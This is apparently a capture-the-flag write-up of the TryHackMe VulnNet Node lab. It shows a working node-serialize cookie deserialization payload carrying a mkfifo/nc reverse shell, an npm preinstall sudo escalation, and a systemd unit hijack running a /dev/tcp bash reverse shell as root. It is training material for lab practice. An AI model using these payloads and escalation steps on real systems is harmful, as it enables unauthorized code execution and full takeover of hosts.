---
layout: post
title: TryHackMe - VulnNet Node Write-Up
date: 2026-09-14
classes: wide
description: Chasing a decoy web application, watching a dead end turn into the way in, and following a privilege escalation that was hiding in plain sight — twice.
---

# TryHackMe - VulnNet Node Write-Up

VulnNet Entertainment is back and, once again, they're confident nothing bad will happen to them. This one is a change of pace compared to the domain controller I roasted last time: a single web application, no domain, and no passwords to crack. Just a lot of trust placed in the client.

Let's see how far that trust goes.

## Initial Scanning

The room description and the title already pointed at the stack, so I went in expecting a NodeJS application. Rustscan knocked on the door first to find what was listening, and nmap did the fingerprinting:

```sh
rustscan -a 10.146.154.216
nmap -p22,8080 -sV -sC 10.146.154.216 -oN nmap.txt
```

The output:

```
Nmap scan report for 10.146.154.216
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:62:5e:a6:b4:b3:47:5a:54:4d:b4:00:dd:70:77:07 (RSA)
|   256 63:b8:9a:c4:a0:a1:53:12:ee:41:90:3e:c1:6e:e8:09 (ECDSA)
|_  256 3d:fd:9f:4b:fd:c1:aa:90:dd:a0:f0:ec:55:ba:c9:56 (ED25519)
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 10 23:03:22 2026 -- 1 IP address (1 host up) scanned in 14.48 seconds
```

SSH and a NodeJS web application on `8080` — nothing else. As a habit I also added the host to `/etc/hosts`; with a single interesting port it wasn't really load-bearing here, it just keeps the commands readable.

The machine was redeployed mid-run, so the IP changed from `10.146.154.216` to `10.144.134.94` — and the prompt gives the new address away, because the box is named `ip-10-144-134-94`. Everything below uses the final one.

## A Login With No Backend

The application is a small news page with a login form at `/login`. Before touching anything, I read the source — and that decided the whole engagement.

The entire site is a decoy. There is no backend login functionality at all: the form doesn't post anywhere useful, and every link on the main page is an anchor pointing to `#`. Nothing to brute-force, nothing to walk through, so the login page was a dead end I was happy to find early.

![The decoy login page](/assets/img/post/thm_vulnnetnode/1.png)

The only useful loot in the static content was usernames — the author pictures use the usernames as filenames. Not a dump and not a breach, just asset naming. Worth remembering on other boxes: sometimes the enumeration win is in the image names.

## The Cookie Is Not a Session

With the front-end out of the picture, the interesting object was the `session` cookie. It's base64, so a quick decode shows what the application considers to be my identity:

```sh
echo 'eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==' | base64 -d
```

```
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

A JSON object living entirely client-side. So I started experimenting with it: changing the username, flipping `isGuest` to `false`, trying different users, adding parameters. The username gets reflected back on the page, which confirms the value is being parsed and used — but that was as far as tampering went. No privilege, no new functionality, just my own string bouncing back at me.

## A Wrong Turn: Hunting for SSTI

Because the username is reflected back into the page, the natural read is template injection. So I forged cookies with different users and pushed multiple SSTI payloads at it, hoping to break out of whatever template engine was rendering that value.

None of it worked — but it wasn't wasted time. One of those payloads threw an error, and the stack trace named the library doing the parsing:

```
SyntaxError: Unexpected end of JSON input
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/www/VulnNet-Node/server.js:16:24
```

That single trace moved the target from template injection to deserialization, and it even leaked the application path. On a NodeJS application, a reflected value plus a serialized cookie is a big hint — I had been staring at the right cookie for the wrong reasons.

The lesson I keep re-learning: the failing payload is often the most informative request you'll send. Don't only log the payloads that land, read the ones that don't.

## Deserialization to Shell

The library in play is `node-serialize`, and its `unserialize()` has a very questionable feature by design: any value tagged with `_$$ND_FUNC$$_` is treated as a function and executed. The cookie isn't an identity claim, it's code.

My first attempts mirrored the usual proof of concept, using an `rce` key and `child_process.exec` with a `mkfifo` as payload:

```
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.138 4444 >/tmp/f')}()"}
```

Base64 that, drop it into the `session` cookie, refresh the page, and the classic `mkfifo` plus `nc` one-liner fires during the deserialization... bullseye:

```
$ whoami
www
$ id
uid=1001(www) gid=1001(www) groups=1001(www)
```

![Penelope catching the reverse shell and upgrading it to a PTY](/assets/img/post/thm_vulnnetnode/2.png)

## Upgrading the Shell

> :bulb: **Quick Tip:** I use [Penelope](https://github.com/brightio/penelope) to handle and upgrade every shell. Instead of fighting a raw connection, it upgrades to a full PTY automatically, which makes interactive work — `sudo`, `systemctl`, anything that wants a terminal — a lot less painful.

That upgrade matters here, because both privilege escalation steps depend on interactive `sudo`.

## From www to serv-manage

First thing after stabilising, my usual `sudo -l`. This is where the box starts handing out the road map:

```sh
sudo -l
```

```
Matching Defaults entries for www on ip-10-144-134-94:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on ip-10-144-134-94:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

Being allowed to run `npm` as another user is not a convenience, it's code execution as that user. GTFOBins has the recipe: a `package.json` with a `preinstall` script, and the install runs it. Since `/usr/bin/npm` is what I'm allowed to run as `serv-manage`, the script executes as `serv-manage`:

```sh
echo '{"scripts": {"preinstall": "/bin/bash"}}' > package.json
sudo -u serv-manage npm -C . i
```

And that drops me into a shell as the service account:

```
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```

The user flag was the easiest part of the machine: `user.txt` sits in the home directory of `serv-manage`, and I had just become that user — so the shell I already had was enough to read it.

```
THM{064640a2...}
```

## From serv-manage to root

`sudo -l` again, and the second half of the road map appears:

```sh
sudo -l
```

```
Matching Defaults entries for serv-manage on ip-10-144-134-94:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on ip-10-144-134-94:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

NOPASSWD `systemctl start`, `stop` and `daemon-reload` on a timer. On its own that isn't root — unless the unit files are writable, which is exactly what I checked next. Both are group-writable for `serv-manage`:

- `/etc/systemd/system/vulnnet-auto.timer` — the timer, firing the job every 30 minutes
- `/etc/systemd/system/vulnnet-job.service` — the service the timer calls, doing nothing more exciting than gathering disk statistics

Unit file permissions *are* root privileges. So I dropped a reverse shell script in `/tmp` and made it executable:

```sh
nano /tmp/rev.sh
chmod +x /tmp/rev.sh
```

```
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.129.138/4443 0>&1
```

Then I pointed the job service at it. The original `Description` and the `# Gather system statistics` comment are still there — the only remains of its previous life — while the `ExecStart` now runs my script:

```sh
nano /etc/systemd/system/vulnnet-job.service
```

```
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/tmp/rev.sh

[Install]
WantedBy=multi-user.target
```

Last piece, the timer: from every 30 minutes down to every 10 seconds.

```sh
nano /etc/systemd/system/vulnnet-auto.timer
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start vulnnet-auto.timer
```

A reload to pick up the modified units, then a start on the timer — and the job runs as root. This time the shell came back on port `4443`, using the direct `/dev/tcp` one-liner instead of the `mkfifo` + `nc` trick from the foothold:

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag follows the same logic as the user one: `root.txt` lives in `/root`, which is exactly why the root shell was necessary — no other identity could read that directory.

```
THM{abea728f...}
```

## Lessons Learned

What makes this box fun is that it never asks you to break anything clever — it asks you to notice what the application already does. The login page is a decoy, the usernames are in the image filenames, and the session cookie is deserialized into code. From there, `sudo -l` gives away the entire privilege escalation, twice: being allowed to run `npm` as another user is code execution as that user, and a writable systemd unit combined with `systemctl start` is root.

The other takeaway is about failing payloads. I spent a while convinced this was template injection because the username was reflected back at me, and it wasn't — but the payload that failed is the one that told me the truth, by erroring out and naming `unserialize`. Read your errors, and be suspicious of any application that stores identity in something the client can edit.

Hack on!
